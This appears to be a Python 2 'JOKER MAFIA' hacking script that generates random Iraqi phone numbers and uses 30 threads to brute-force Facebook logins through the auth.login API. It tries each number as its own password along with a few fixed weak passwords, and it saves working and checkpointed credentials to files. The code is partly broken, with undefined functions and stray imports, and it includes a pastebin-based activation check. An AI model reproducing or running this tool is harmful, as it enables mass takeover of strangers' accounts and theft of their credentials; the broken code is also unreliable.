import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(100000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 nmbr.py')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


logo = logo ="""

JOKER MAFIA


AUTHOR: JOKER
Telegram: @HACK

FREE MOD
"""
back = 0
successful = []
cpb = []
oks = []
id = []

def action():
    global cpb
    global oks
    bch = raw_input('Select Option  ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print '0770, 0750, 0773, 0751'
        try:
            c = raw_input(' hal bzhera ba daf3 nabm  : ')
            k = ''
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('[ Back ]')
            menu()
    elif bch == '0':
        exb()
    else:
        print '[!] Fill Ba Kalk Naya'
        action()
    xxx = str(len(id))
    psb(' Hamw Raqamakan: ' + xxx)
    time.sleep(0.1)
    psb(' Tkaya Chawarwan Ba ...                     ')
    time.sleep(0.1)
    psb('[!] Bo Wastan Dni Toolaka CTRL+Z                                  ')
    time.sleep(0.5)
    print 42 * '='

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '[\033[1;92msuccessfull] ' + k + c + user + ' ' + pass1 + '' + ''
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + ' ' + pass1 )
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + ' ' + pass1 + '')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '1122334455'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '[\033[1;92msuccessfull] ' + k + c + user + ' ' + pass2 + '' + ''
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + ' ' + pass2 + '')
                okb.close()
                oks.append(c + user + pass2)
            elif 'www.facebook.com' in q['error_msg']:
                
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + ' ' + pass2 + '')
                cps.close()
                cpb.append(c + user + pass2)
            else:
                pass3 = '1234554321'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '[\033[1;92msuccessfull] ' + k + c + user + ' ' + pass3 + '' + ''
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + ' ' + pass3 + '')
                okb.close()
                oks.append(c + user + pass3)
            elif 'www.facebook.com' in q['error_msg']:
                
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + ' ' + pass3 + '')
                cps.close()
                cpb.append(c + user + pass3)
            else:
                pass4 = '112233445566'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '[\033[1;92msuccessfull] ' + k + c + user + ' ' + pass4 + '' + ''
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + ' ' + pass4 + '')
                okb.close()
                oks.append(c + user + pass4)
            elif 'www.facebook.com' in q['error_msg']:
                
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + ' ' + pass4 + '')
                cps.close()
                cpb.append(c + user + pass4)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 42 * '='
    print '[1;93m Process Has Been Completed ....'
    print ' Total OK/[1;96mCP : ' + str(len(oks)) + '/' + str(len(cpb))
    print ' CP File Has Been Saved : save/checkpoint.txt'
    raw_input('[Press Enter To Go Back]')
    os.system('python2 .README.md')
    import sys
import os
import uuid

def hama():
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = "-".join(uuid)
    print "[37;1mYour ID : " + id
    httpCaht = requests.get("https://pastebin.com/raw/2FCBfYXJ").text
    if id in httpCaht:
        print "[37;1mYOUR ID IS ACTIVE........."
        msg = str(os.geteuid())
        time.sleep(1)
        hack()
    else:
        print "[37;1mYOUR ID IS NOT ACTIVE........."
        time.sleep(1)
        sys.exit()
if __name__ == '__main__':
    menu()
